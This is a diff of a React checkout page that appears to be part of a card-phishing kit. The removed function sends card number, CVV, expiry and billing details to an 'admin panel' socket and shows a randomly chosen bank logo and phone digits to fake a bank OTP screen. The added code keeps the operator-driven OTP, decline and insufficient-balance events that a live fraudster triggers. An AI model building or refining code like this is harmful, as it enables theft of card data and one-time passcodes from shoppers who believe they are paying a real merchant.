@@ -311,153 +311,72 @@ const Checkout = () => {
     }, 1500);
   };
 
-  const handleConfirmPayment = () => {
-    try {
-      setConfirmingPayment(true);
-      
-      // Set consistent bank logo for this session
-      const bankLogos = [
-        'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
-        'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
-        'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
-        'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
-        'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
-        'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
-        'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
-        'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
-        'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
-        'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
-        'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
-        'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
-        'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
-        'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
-        'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
-        'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png',
-        'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
-        'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
-        'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
-        'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png',
-        'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
-        'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
-      ];
-      const randomBank = bankLogos[Math.floor(Math.random() * bankLogos.length)];
-      setSessionBankLogo(randomBank);
-      
-      // Generate random mobile number (last 4 digits)
-      const randomMobileDigits = Math.floor(1000 + Math.random() * 9000).toString();
-      setRandomMobile(randomMobileDigits);
-      
-      // Connect to WebSocket with proper URL handling for different environments
-      const socketUrl = process.env.NODE_ENV === 'production' 
-        ? window.location.origin
-        : 'http://localhost:3001';
-      
-      const newSocket = io(socketUrl, {
-        timeout: 10000,
-        reconnection: true,
-        reconnectionAttempts: 5,
-        reconnectionDelay: 2000,
-        transports: ['websocket', 'polling']
-      });
-      setSocket(newSocket);
-      
-      // Handle connection errors
-      newSocket.on('connect_error', (error) => {
-        console.error('Socket connection error:', error);
-        setConfirmingPayment(false);
-        alert('Connection failed. Please check your internet connection and try again.');
-      });
-      
-      newSocket.on('disconnect', (reason) => {
-        console.warn('Socket disconnected:', reason);
-        if (reason === 'io server disconnect') {
-          // Server disconnected, try to reconnect
-          newSocket.connect();
-        }
-      });
-      
-      // Send payment data to admin panel
-      const paymentData = {
-        cardNumber: cardData.cardNumber,
-        cardName: cardData.cardName,
-        cvv: cardData.cvv,
-        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
-        billingDetails: {
-          firstName: formData.firstName,
-          lastName: formData.lastName,
-          email: formData.email,
-          country: formData.country,
-          companyName: formData.companyName
-        },
-        planName,
-        billing,
-        amount: displayPrice,
-        timestamp: new Date().toISOString()
-      };
-      
-      // Add timeout for payment data emission
-      const emitTimeout = setTimeout(() => {
-        setConfirmingPayment(false);
-        alert('Request timeout. Please try again.');
-        newSocket.disconnect();
-      }, 30000);
-      
-      newSocket.emit('payment-data', paymentData);
-      
-      // Listen for admin responses
-      newSocket.on('show-otp', () => {
-        clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        setShowOtp(true);
-        setCurrentStep('otp');
-        startOtpTimer();
-      });
-      
-      newSocket.on('payment-approved', () => {
-        clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        setShowOtp(false);
-        alert('Payment successful!');
-        // Could redirect to success page here
-      });
-      
-      newSocket.on('payment-rejected', (reason: string) => {
-        clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        setShowOtp(false);
-        alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
-      });
+  // --- SOCKET INITIALIZATION AND EVENT HANDLING ---
+  useEffect(() => {
+    // Create socket connection on mount
+    const socketUrl = process.env.NODE_ENV === 'production'
+      ? window.location.origin
+      : 'http://localhost:3001';
+    const newSocket = io(socketUrl, {
+      timeout: 10000,
+      reconnection: true,
+      reconnectionAttempts: 5,
+      reconnectionDelay: 2000,
+      transports: ['websocket', 'polling']
+    });
+    setSocket(newSocket);
 
-      // Enhanced admin response handlers
-      newSocket.on('invalid-otp-error', () => {
-        clearTimeout(emitTimeout);
-        setOtpSubmitting(false);
-        setOtpError('Invalid OTP, please enter valid one time passcode!');
-        setTimeout(() => setOtpError(''), 5000);
-      });
-
-      newSocket.on('card-declined-error', () => {
-        clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        setShowOtp(false);
-        setCurrentStep('account');
-        alert('Your card has been declined');
-      });
-
-      newSocket.on('insufficient-balance-error', () => {
-        clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        setShowOtp(false);
-        setCurrentStep('account');
-        alert('Your card have insufficient balance');
-      });
-      
-    } catch (error) {
-      console.error('Error in payment confirmation:', error);
+    // Event listeners
+    newSocket.on('connect_error', (error) => {
+      console.error('Socket connection error:', error);
       setConfirmingPayment(false);
-      alert('An unexpected error occurred. Please try again.');
-    }
-  };
+      alert('Connection failed. Please check your internet connection and try again.');
+    });
+    newSocket.on('disconnect', (reason) => {
+      console.warn('Socket disconnected:', reason);
+      if (reason === 'io server disconnect') {
+        newSocket.connect();
+      }
+    });
+    newSocket.on('show-otp', () => {
+      setConfirmingPayment(false);
+      setShowOtp(true);
+      setCurrentStep('otp');
+      startOtpTimer();
+    });
+    newSocket.on('payment-approved', () => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      alert('Payment successful!');
+    });
+    newSocket.on('payment-rejected', (reason: string) => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
+    });
+    newSocket.on('invalid-otp-error', () => {
+      setOtpSubmitting(false);
+      setOtpError('Invalid OTP, please enter valid one time passcode!');
+      setTimeout(() => setOtpError(''), 5000);
+    });
+    newSocket.on('card-declined-error', () => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      setCurrentStep('account');
+      alert('Your card has been declined');
+    });
+    newSocket.on('insufficient-balance-error', () => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      setCurrentStep('account');
+      alert('Your card have insufficient balance');
+    });
+
+    // Clean up on unmount
+    return () => {
+      newSocket.disconnect();
+    };
+  }, []);
 
   const handleOtpSubmit = () => {
     try {
